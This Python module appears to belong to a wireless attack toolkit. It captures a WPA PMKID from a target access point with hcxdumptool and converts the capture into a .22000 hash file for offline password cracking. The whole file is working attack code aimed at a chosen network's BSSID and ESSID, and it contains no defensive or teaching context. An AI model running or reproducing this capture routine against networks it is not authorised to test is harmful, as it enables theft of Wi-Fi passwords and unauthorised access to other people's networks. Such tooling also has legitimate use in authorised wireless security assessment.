# -*- coding: utf-8 -*-
"""Optional PMKID capture — hcxdumptool → hcxpcapngtool → .22000 hash file.

Secondary attack (behind the PMKID toggle). Structured output: success is the
existence of a non-empty .22000 file, not scraped text.
"""
import os
import re
import subprocess
import time

import config
from attack import tools
from attack.model import AttackEvent, EventType


def _safe(name):
    return re.sub(r"[^A-Za-z0-9_-]", "_", (name or "unknown"))[:24]


def capture(mon, target, req, emit, stop_flag):
    """Try to grab a PMKID for one target. Returns {"ok","hash","essid","bssid"}."""
    bssid = target["bssid"]
    essid = target.get("essid") or bssid
    if not tools.tool_ok(tools.HCXDUMP):
        return {"ok": False, "essid": essid, "bssid": bssid}
    os.makedirs(config.CAPTURE_DIR, exist_ok=True)
    base = os.path.join(config.CAPTURE_DIR, "%s_%s" % (_safe(essid),
                        bssid.replace(":", "")))
    pcapng = base + ".pcapng"
    hashfile = base + ".22000"
    for old in (pcapng, hashfile):
        try:
            os.remove(old)
        except OSError:
            pass

    timeout = config.opt_int(req.timing, "WPA Timeout", 300)
    cmd = [tools.HCXDUMP, "-i", mon, "-w", pcapng,
           "--enable_status=1"]
    emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
                     phase="PMKID", countdown=timeout, cd_max=timeout))
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL)
    except Exception as e:  # noqa: BLE001
        tools.log("hcxdumptool failed: %s" % e)
        return {"ok": False, "essid": essid, "bssid": bssid}

    start = time.time()
    try:
        while (time.time() - start) < timeout:
            if stop_flag and stop_flag.is_set():
                return {"ok": False, "essid": essid, "bssid": bssid,
                        "cancelled": True}
            time.sleep(3)
    finally:
        try:
            proc.terminate()
            proc.wait(timeout=3)
        except Exception:  # noqa: BLE001
            try:
                proc.kill()
            except Exception:  # noqa: BLE001
                pass

    # Convert to a 22000 hash; success = a non-empty hash file.
    if os.path.exists(pcapng) and tools.tool_ok(tools.HCXPCAP):
        tools.run([tools.HCXPCAP, "-o", hashfile, pcapng], timeout=30)
    if os.path.exists(hashfile) and os.path.getsize(hashfile) > 0:
        emit(AttackEvent(EventType.PMKID, essid=essid, bssid=bssid))
        return {"ok": True, "hash": hashfile, "essid": essid, "bssid": bssid}
    return {"ok": False, "essid": essid, "bssid": bssid}
